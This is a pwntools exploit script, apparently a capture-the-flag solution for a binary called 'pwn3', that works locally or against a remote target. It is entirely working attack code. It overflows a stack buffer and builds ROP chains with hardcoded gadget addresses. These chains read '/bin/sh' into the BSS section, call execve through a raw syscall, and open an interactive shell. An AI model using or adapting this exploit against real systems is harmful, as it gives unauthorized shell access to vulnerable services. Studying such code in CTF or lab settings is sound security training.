from pwn import *
import sys
if len(sys.argv) < 2:
	p = process("./pwn3")
else:
	p = remote(ip,addr)

#rax = 59, rdi = /bin/sh,rsi=0,rdx=0
bss_addr = 0x6CD700
pop_rax_rdx_rbx_ret = 0x4783c6
pop_rdi_ret = 0x00000000004014c6
pop_rsi_ret = 0x00000000004015e7
read_addr = 0x000000000043F1B0
vul_addr = 0x4009CF
syscall_addr = 0x0000000000466ff5
padding = (0x80+8)*"a"
binsh = "/bin/sh\x00"
#gdb.attach(p,"b *0x4009CD")
#context.log_level = "debug"
payload = padding + p64(pop_rax_rdx_rbx_ret) + p64(0) + p64(len(binsh)) + p64(0)
payload +=  p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(bss_addr) + p64(read_addr) + p64(vul_addr)
p.sendafter("welcome~\n",payload)
raw_input()
p.send(binsh)

payload = padding
payload += p64(pop_rax_rdx_rbx_ret) + p64(59) + p64(0) + p64(0) + p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(0) + p64(syscall_addr)
p.sendafter("welcome~\n",payload)
p.interactive()
